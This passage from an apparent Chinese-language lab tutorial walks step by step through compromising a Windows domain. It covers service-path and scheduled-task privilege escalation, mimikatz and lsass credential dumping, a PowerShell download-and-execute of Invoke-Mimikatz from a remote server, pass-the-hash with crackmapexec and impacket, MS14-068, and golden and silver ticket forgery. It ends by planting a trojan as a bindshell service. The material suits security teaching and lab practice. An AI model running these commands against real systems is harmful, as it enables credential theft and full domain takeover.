</pre></div>
<p>探测漏洞是否存在可以通过命令：</p>
<div class="highlight"><pre><span></span><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">displayname</span><span class="p">,</span><span class="n">startmode</span><span class="p">,</span><span class="n">pathname</span><span class="o">|</span><span class="n">findstr</span> <span class="sr">/i "Auto" | findstr /i</span> <span class="o">/</span><span class="n">v</span> <span class="s">"C:\Windows\\"</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141912-7160c5e4-4cee-1.png"/><br/>
假设这里使用vmtoolsd.exe为例，首先我在C:\Program Files\VMware\新建一个VMware.exe，这里我把calc.exe放进去，然后重启vmtoolsd.exe服务<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142420-286266da-4cef-1.png"/></p>
<h3 data-content="1" id="8088ba92dde98d0e1b97de8297ee1679">(四)、计划任务提权</h3>
<p>前面有提到，让某任务以高权限身份运行即可</p>
<div class="highlight"><pre><span></span><span class="n">schtasks</span> <span class="sr">/create /sc</span> <span class="n">MINUTE</span> <span class="sr">/mo 1 /</span><span class="n">tn</span> <span class="n">win2</span> <span class="sr">/tr "C:\cmd.exe" /</span><span class="n">ru</span> <span class="nb">system</span> <span class="o">/</span><span class="n">f</span>
</pre></div>
<h3 data-content="1" id="2ed15720b453211274b5b8805b7e8540">(五)、psexec提权</h3>
<p>PsExec 是一个轻型的 telnet 替代工具，可以无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。PsExec 最强大的功能之一是在远程系统和远程支持工具（如 IpConfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p>
<p>1、通过psexec获取一个system权限的cmd<br/>
使用方法：</p>
<div class="highlight"><pre><span></span><span class="n">psexec</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">sid</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142321-0556476a-4cef-1.png"/></p>
<h2 data-content="1" id="036f1226b52a012e8bb0b8a9403b6455">十、横向移动2</h2>
<h3 data-content="1" id="07d5e9e0fb95a805d6d19bbf6f034e4c">(一)、获取Hash的几种方法</h3>
<p>1、基于sam和system文件<br/>
导出sam和system文件</p>
<div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="o">\</span><span class="nb">system</span>  <span class="nb">system</span><span class="o">.</span><span class="n">hive</span>
<span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="o">\</span><span class="n">sam</span> <span class="n">sam</span><span class="o">.</span><span class="n">hive</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142248-f18c6ebc-4cee-1.png"/><br/>
使用mumitatz读取sam和system文件</p>
<div class="highlight"><pre><span></span><span class="nn">lsadump::</span><span class="n">sam</span> <span class="sr">/sam:C:/</span><span class="mi">1</span><span class="sr">/sam.hive /s</span><span class="n">ystem:C:</span><span class="sr">/1/s</span><span class="n">ystem</span><span class="o">.</span><span class="n">hive</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141858-688cd1ec-4cee-1.png"/><br/>
2、mimikatz</p>
<div class="highlight"><pre><span></span><span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span> <span class="nn">privilege::</span><span class="n">debug</span> <span class="nn">sekurlsa::</span><span class="n">logonpasswords</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142635-796a039e-4cef-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142815-b5038c04-4cef-1.png"/><br/>
3、procdump<br/>
下载地址：<br/>
<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
<div class="highlight"><pre><span></span><span class="n">Procdump</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">ma</span> <span class="n">lsass</span><span class="o">.</span><span class="n">exe</span> <span class="n">lsass</span><span class="o">.</span><span class="n">dmp</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142351-172e0b12-4cef-1.png"/><br/>
然后在当前目录下会生成一个lsass.dmp文件<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142305-fc0d8d30-4cee-1.png"/><br/>
通过mimikatz分析文件获取hash</p>
<div class="highlight"><pre><span></span><span class="nn">privilege::</span><span class="n">debug</span>
<span class="nn">sekurlsa::</span><span class="n">minidump</span> <span class="n">lsass</span><span class="o">.</span><span class="n">dmp</span>
<span class="nn">sekurlsa::</span><span class="n">logonpasswords</span> <span class="n">full</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141828-56f900fe-4cee-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142918-da85075a-4cef-1.png"/></p>
<p>4、使用powershell<br/>
先在服务器新建一个python web服务，位置为PowerSploit<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142655-84d622da-4cef-1.png"/><br/>
在受害机下载脚本并执行</p>
<div class="highlight"><pre><span></span><span class="n">IEX</span><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">Net</span><span class="o">.</span><span class="n">WebClient</span><span class="p">)</span><span class="o">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s">"http://vps-ip:4545/Exfiltration/Invoke-Mimikatz.ps1"</span><span class="p">)</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCreds</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142452-3b80220c-4cef-1.png"/></p>
<h3 data-content="1" id="d92b3150babc7f8a894dd38c7f02e082">(二)、pth的几种方法</h3>
<p>前面已经获取了域控制器的hash，那么可以通过hash进行pth攻击<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142712-8f09dae4-4cef-1.png"/><br/>
输入log可以生成日志，方便复制粘贴<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142834-bfff6e3e-4cef-1.png"/></p>
<div class="highlight"><pre><span></span><span class="o">*</span> <span class="n">NTLM</span>     <span class="p">:</span> <span class="n">f1de694efa543bb780da59c049541ea3</span>
</pre></div>
<p>1、使用mimikatz进行pth</p>
<div class="highlight"><pre><span></span><span class="nn">sekurlsa::</span><span class="n">pth</span> <span class="sr">/user:administrator /</span><span class="n">domain:</span><span class="s">"xxx.cool"</span> <span class="o">/</span><span class="n">ntlm:f1de694efa543bb780da59c049541ea3</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142558-634daa70-4cef-1.png"/><br/>
执行完后弹出一个具有域控权限的cmd<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142619-6f9ab0ca-4cef-1.png"/><br/>
具体可以查看前一篇文章，<a href="https://xz.aliyun.com/t/10439" target="_blank">内网渗透初探</a></p>
<p>2、使用Crackmapexec<br/>
kali下进行安装</p>
<div class="highlight"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">crackmapexec</span>
</pre></div>
<p>输入如下命令即可</p>
<p>IP ：可以是单个IP也可以是IP段<br/>
-u ：指定用户名<br/>
-H ：指定NTLM Hash<br/>
-d ：指定域<br/>
-x ：执行系统命令</p>
<div class="highlight"><pre><span></span><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168.30.128</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="n">f1de694efa543bb780da59c049541ea3</span> <span class="o">-</span><span class="n">d</span> <span class="n">xxx</span><span class="o">.</span><span class="n">cool</span> <span class="o">-</span><span class="n">x</span> <span class="n">whoami</span>
</pre></div>
<p>可以看到返回了域控的管理员<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142213-dd416b6a-4cee-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168.30.128</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="n">f1de694efa543bb780da59c049541ea3</span> <span class="o">-</span><span class="n">d</span> <span class="n">xxx</span><span class="o">.</span><span class="n">cool</span> <span class="o">-</span><span class="n">x</span> <span class="n">ipconfig</span>
</pre></div>
<p>可以看到执行结果，ip为域控IP<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143034-078c2e86-4cf0-1.png"/><br/>
3、使用impackt工具包<br/>
下载地址：<br/>
<a href="https://github.com/SecureAuthCorp/impacket" target="_blank">https://github.com/SecureAuthCorp/impacket</a><br/>
这里简单列举几个<br/>
<strong>wmiexec.py</strong></p>
<div class="highlight"><pre><span></span><span class="n">python3</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="mo">00000000000000000000000000000000</span><span class="p">:</span><span class="n">f1de694efa543bb780da59c049541ea3</span> <span class="n">Administrator</span><span class="nv">@192</span><span class="mf">.168.30.128</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143106-1a98bda0-4cf0-1.png"/><br/>
<strong>psexec.py</strong></p>
<div class="highlight"><pre><span></span><span class="n">python3</span> <span class="n">psexec</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="mo">00000000000000000000000000000000</span><span class="p">:</span><span class="n">f1de694efa543bb780da59c049541ea3</span> <span class="n">Administrator</span><span class="nv">@192</span><span class="mf">.168.30.128</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142759-ab439592-4cef-1.png"/><br/>
<strong>smbclient.py</strong></p>
<div class="highlight"><pre><span></span><span class="n">python3</span> <span class="n">smbclient</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="mo">00000000000000000000000000000000</span><span class="p">:</span><span class="n">f1de694efa543bb780da59c049541ea3</span> <span class="n">xxx</span><span class="o">.</span><span class="n">cool</span><span class="o">/</span><span class="n">Administrator</span><span class="nv">@192</span><span class="mf">.168.30.128</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142953-ef0a56e4-4cef-1.png"/><br/>
可以执行很多操作<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142729-9988a0ae-4cef-1.png"/></p>
<h2 data-content="1" id="7123ef7b368470a9a865e529e0af0b05">十一、PTT（票据传递）</h2>
<h3 data-content="1" id="87ff42a9815023509493b178469c83fd">(一)、MS14-068</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142538-57767dee-4cef-1.png"/><br/>
需要条件：</p>
<div class="highlight"><pre><span></span><span class="n">域内普通用户SID</span>
<span class="n">域内普通用户密码</span>
</pre></div>
<p>下载地址：<br/>
<a href="https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2014-6324" target="_blank">https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2014-6324</a><br/>
1、首先获取了一个域用户权限，在无法提权的情况下，获取用户名和SID</p>
<div class="highlight"><pre><span></span><span class="n">whoami</span> <span class="o">/</span><span class="n">all</span>

<span class="n">xxx</span><span class="o">\</span><span class="n">web</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3296092892</span><span class="o">-</span><span class="mi">1320626564</span><span class="o">-</span><span class="mi">2720975204</span><span class="o">-</span><span class="mi">1105</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142506-4450d390-4cef-1.png"/><br/>
2、上传ms14-068.exe，并执行下面的命令<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142935-e486bb40-4cef-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">ms14</span><span class="o">-</span><span class="mo">06</span><span class="mi">8</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">u</span> <span class="n">域成员名</span><span class="nv">@域名</span> <span class="o">-</span><span class="n">s</span> <span class="n">域成员sid</span> <span class="o">-</span><span class="n">d</span> <span class="n">域控制器ip地址</span> <span class="o">-</span><span class="n">p</span> <span class="n">域成员密码</span>

<span class="n">ms14</span><span class="o">-</span><span class="mo">06</span><span class="mi">8</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">u</span> <span class="n">web</span><span class="nv">@xxx</span><span class="o">.</span><span class="n">cool</span> <span class="o">-</span><span class="n">s</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3296092892</span><span class="o">-</span><span class="mi">1320626564</span><span class="o">-</span><span class="mi">2720975204</span><span class="o">-</span><span class="mi">1105</span> <span class="o">-</span><span class="n">d</span> <span class="mf">192.168.30.128</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1234</span><span class="p">,</span><span class="n">abcd</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142405-1fff2ce4-4cef-1.png"/><br/>
如图成功生成了票据文件<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143141-2f65ee92-4cf0-1.png"/><br/>
3、将票据注入到内存中</p>
<div class="highlight"><pre><span></span><span class="nn">kerberos::</span><span class="n">purge</span>                      <span class="sr">//</span><span class="n">清空当前机器中所有凭证</span><span class="err">，</span><span class="n">如果有域成员凭证会影响凭证伪造</span>
<span class="nn">kerberos::</span><span class="n">list</span>                       <span class="sr">//</span><span class="n">查看当前机器凭证</span>
<span class="nn">kerberos::</span><span class="n">ptc</span> <span class="n">TGT_xxx</span><span class="nv">@domain</span><span class="o">.</span><span class="n">cache</span>   <span class="sr">//</span><span class="n">将票据注入到内存中</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143204-3d54267c-4cf0-1.png"/><br/>
4、成功net user 到域控<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143245-55653918-4cf0-1.png"/><br/>
5、删除票据之后显示拒绝访问<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143415-8b52b262-4cf0-1.png"/></p>
<h3 data-content="1" id="47eb132765a10ad6a6c60cb6e6301ab2">(二)、黄金票据</h3>
<p>具体可以查看前一篇文章，<a href="https://xz.aliyun.com/t/10439" target="_blank">内网渗透初探</a><br/>
1、在域控机器中，通过mimikatz输入命令获取krbtgt的hash值</p>
<div class="highlight"><pre><span></span><span class="nn">privilege::</span><span class="n">debug</span>
<span class="nn">lsadump::</span><span class="n">dcsync</span> <span class="o">/</span><span class="n">user:krbtgt</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143341-76ec1d36-4cf0-1.png"/><br/>
2、获取制作黄金票据需要的数据</p>
<pre><code>Object Security ID   : S-1-5-21-3296092892-1320626564-2720975204
Hash NTLM: 31edc56a2302a25a2e9bee5f04abd659</code></pre>
<p>原Object Security ID最后面有个-502是作为标识的，在制作时需要手动删除。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143227-4b13bce6-4cf0-1.png"/></p>
<p>3、退出远程桌面，在攻击机通过mimikatz制作黄金票据。执行命令后会生成一个administrator.kiribi文件。</p>
<pre><code>kerberos::golden /admin:administrator /domain:域名 /sid:SID号 /krbtgt:ntlm值 /ticket:生成的票据文件名.kiribi

kerberos::golden /admin:administrator /domain:xxx.cool /sid:S-1-5-21-3296092892-1320626564-2720975204 /krbtgt:31edc56a2302a25a2e9bee5f04abd659 /ticket:administrator.kiribi</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143013-fadc342e-4cef-1.png"/><br/>
4、制作完票据之后，先尝试获取域控的c盘的权限，无法获取。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143300-5ea7426e-4cf0-1.png"/><br/>
5、通过mimikatz执行以下命令。</p>
<div class="highlight"><pre><span></span><span class="nn">kerberos::</span><span class="n">purge</span>                      <span class="sr">//</span><span class="n">清空当前机器中所有凭证</span><span class="err">，</span><span class="n">如果有域成员凭证会影响凭证伪造</span>
<span class="nn">kerberos::</span><span class="n">list</span>                       <span class="sr">//</span><span class="n">查看当前机器凭证</span>
<span class="nn">kerberos::</span><span class="n">ptt</span> <span class="n">administrator</span><span class="o">.</span><span class="n">kiribi</span>   <span class="sr">//</span><span class="n">将票据注入到内存中</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143503-a80f964a-4cf0-1.png"/><br/>
6、成功获取域控c盘权限。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143358-81498944-4cf0-1.png"/></p>
<h3 data-content="1" id="8d317cc1a2d4b6c36bac2a0d13292691">(三)、白银票据</h3>
<p>1、导出hash</p>
<div class="highlight"><pre><span></span><span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span> <span class="s">"privilege::debug"</span> <span class="s">"sekurlsa::logonpasswords"</span> <span class="s">"exit"</span><span class="o">&gt;</span><span class="nb">log</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143052-1277c92c-4cf0-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143319-69be2352-4cf0-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143440-9a5a4996-4cf0-1.png"/><br/>
SID最后的500为标识符，这里不需要；计算机全名也就是mimikatz导出的<strong>username+域名</strong></p>
<div class="highlight"><pre><span></span><span class="n">NTLM</span>     <span class="p">:</span> <span class="mi">75</span><span class="n">f490ed04ba66f04e0e947a185679bd</span>
<span class="n">SID</span>      <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3296092892</span><span class="o">-</span><span class="mi">1320626564</span><span class="o">-</span><span class="mi">2720975204</span>
<span class="n">计算机全名</span> <span class="p">:</span><span class="n">AD</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">cool</span>
</pre></div>
<p>2、在攻击机上执行命令生成票据</p>
<div class="highlight"><pre><span></span><span class="nn">kerberos::</span><span class="n">golden</span> <span class="sr">/domain:&lt;域名&gt; /si</span><span class="n">d:</span><span class="o">&lt;</span><span class="n">域</span> <span class="n">SID</span><span class="o">&gt;</span> <span class="sr">/target:&lt;目标服务器主机名&gt; /s</span><span class="n">ervice:</span><span class="sr">&lt;服务类型&gt;</span> <span class="sr">/rc4:&lt;NTLMHash&gt; /</span><span class="n">user:</span><span class="sr">&lt;伪造的用户名&gt;</span> <span class="o">/</span><span class="n">ptt</span>

<span class="nn">kerberos::</span><span class="n">golden</span> <span class="sr">/domain:xxx.cool /si</span><span class="n">d:S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3296092892</span><span class="o">-</span><span class="mi">1320626564</span><span class="o">-</span><span class="mi">2720975204</span> <span class="sr">/target:AD.xxx.cool /s</span><span class="n">ervice:cifs</span> <span class="sr">/rc4:75f490ed04ba66f04e0e947a185679bd /</span><span class="n">user:admin123</span> <span class="o">/</span><span class="n">ptt</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124143124-2550b130-4cf0-1.png"/></p>
<div class="highlight"><pre><span></span><span class="nn">kerberos::</span><span class="n">list</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142855-cc8536de-4cef-1.png"/><br/>
3、前面读取域控文件内容如下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142158-d4063f26-4cee-1.png"/><br/>
4、拿到权限后，可以有多个选择</p>
<div class="highlight"><pre><span></span><span class="mi">1</span><span class="err">、</span><span class="n">传马</span><span class="o">+</span><span class="n">计划任务执行</span>
<span class="n">copy</span> <span class="n">win</span><span class="o">.</span><span class="n">exe</span> <span class="o">\\</span><span class="n">AD</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">cool</span><span class="o">\</span><span class="n">c</span><span class="nv">$</span>
<span class="nv">sc</span> <span class="o">\\</span><span class="n">AD</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">cool</span> <span class="n">create</span> <span class="n">bindshell</span> <span class="n">binpath</span><span class="o">=</span> <span class="s">"c:\win.exe"</span>

<span class="mi">2</span><span class="err">、</span><span class="n">psexec</span><span class="o">.</span><span class="n">exe</span> <span class="o">\\</span><span class="n">域控地址</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>

<span class="mi">3</span><span class="err">、</span><span class="n">其他</span><span class="err">。。。</span>
</pre></div>
<p>我这里用方法2，成功获取了域控的system权限的cmd。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141023-35c56de2-4ced-1.png"/></p>
<h2 data-content="1" id="d0074c49e099347caf494cd9cac55ab7">十二、参考链接</h2>
<p><a href="https://mp.weixin.qq.com/s/CsFvBkk29wiVIX5dy8omtA" target="_blank">https://mp.weixin.qq.com/s/CsFvBkk29wiVIX5dy8omtA</a><br/>
<a href="https://mp.weixin.qq.com/s/nq3RTFQH_WpC2BfviMmtJw" target="_blank">https://mp.weixin.qq.com/s/nq3RTFQH_WpC2BfviMmtJw</a><br/>
<a href="https://mp.weixin.qq.com/s/l9x5pEX-0HvIB0HdNQL-aw" target="_blank">https://mp.weixin.qq.com/s/l9x5pEX-0HvIB0HdNQL-aw</a><br/>
<a href="https://mp.weixin.qq.com/s/MtomFV5oKziT6_Zt1rBpKQ" target="_blank">https://mp.weixin.qq.com/s/MtomFV5oKziT6_Zt1rBpKQ</a></p>
</div>
</div>